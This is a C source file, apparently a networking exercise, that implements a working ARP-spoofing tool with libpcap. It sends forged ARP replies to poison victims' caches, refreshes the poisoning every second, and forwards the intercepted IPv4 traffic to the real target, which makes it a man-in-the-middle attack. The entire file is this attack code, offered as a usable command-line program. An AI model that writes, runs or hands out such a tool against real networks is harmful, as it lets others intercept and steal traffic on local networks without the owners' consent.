#include <stdio.h>
#include <pcap.h>
#include "arp-spoof.h"


void usage() {
    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : arp-spoof ens32 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int main(int argc, char* argv[]) {
    if (argc % 2 != 0 || argc < 3) {
		usage();
		return -1;
	}
    
    char sender_ip[50][50];
    char target_ip[50][50];
    char sender_mac[50][20];
    char target_mac[50][20];
    char attack_ip[50];    
    char attack_mac[20];
    uint8_t attack_mac_conv[6];
    unsigned int tmp[6];
                
    
    time_t checkpoint, current;
    int i;

    char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	
    if (handle == nullptr) {
        fprintf(stderr, "Device open error! %s return nullptr : %s\n", dev, errbuf);
        return -1;
    }
    
    get_attacker_ip(attack_ip, argv[1]);
    get_attacker_mac(attack_mac, argv[1]);
    sscanf(attack_mac, "%02x:%02x:%02x:%02x:%02x:%02x", &tmp[0], &tmp[1], &tmp[2], &tmp[3], &tmp[4], &tmp[5]);
    for(int i = 0; i < 6; i++) attack_mac_conv[i] = (uint8_t) tmp[i];
    
    int cnt = 1;
    while (1) {
        if (cnt == (argc / 2)) break;
        
        strcpy(sender_ip[cnt - 1], argv[cnt*2]);
        strcpy(target_ip[cnt - 1], argv[cnt*2+1]);
        get_host_mac(sender_ip[cnt - 1], sender_mac[cnt - 1], attack_ip, attack_mac, handle);
        get_host_mac(target_ip[cnt - 1], target_mac[cnt - 1], attack_ip, attack_mac, handle);

        // infection
        send_arp_pkt(sender_ip[cnt - 1], sender_mac[cnt - 1], target_ip[cnt - 1], attack_mac, handle, 2);
        cnt++;
    }

    checkpoint = time(NULL);
    
    while(1) {
        current = time(NULL);
        if (current - checkpoint > 1) {
            for (i = 0; i < (argc / 2 - 1); i++) send_arp_pkt(sender_ip[i], sender_mac[i], target_ip[i], attack_mac, handle, 2);
            checkpoint = current;
        }        
        struct pcap_pkthdr* header;
        uint8_t* rcv_packet;
        int res = pcap_next_ex(handle, &header, (const u_char **)&rcv_packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            fprintf(stderr, "pcap_next_ex return error! %d(%s).\n", res, pcap_geterr(handle));
            break;
        }
        else {
            if((rcv_packet[12] == 0x08) && (rcv_packet[13] == 0x00)) {
                uint8_t current_src_ip[4];
               
                for(i = 0; i < 4; i++) current_src_ip[i] = rcv_packet[26+i];
                
                bool control_flag = false;
                for (i = 0; i < (argc / 2 - 1); i++) {
                    if (check_packet(sender_ip[i], current_src_ip)) {
                        control_flag = true;
                        break;
                    }
                }
                if (!control_flag) continue;

                uint8_t dest_mac[6];
                sscanf(target_mac[i], "%02x:%02x:%02x:%02x:%02x:%02x", &tmp[0], &tmp[1], &tmp[2], &tmp[3], &tmp[4], &tmp[5]);
                for (i = 0; i < 6; i++) dest_mac[i] = (uint8_t) tmp[i];
            
                for (i = 0; i < 6; i++) {
                    rcv_packet[i] = dest_mac[i];
                    rcv_packet[6+i] = attack_mac_conv[i];
                }
                int ippkt_len = ntohs(*((uint16_t*)(rcv_packet + 16)));
                int res2 = pcap_sendpacket(handle, (const u_char*)rcv_packet, ippkt_len + Ethhdr_Len + 4);
                if (res2 != 0) {
                    fprintf(stderr, "Send IP packet error!\n");
                }
            }
        }
    }

    pcap_close(handle);    
}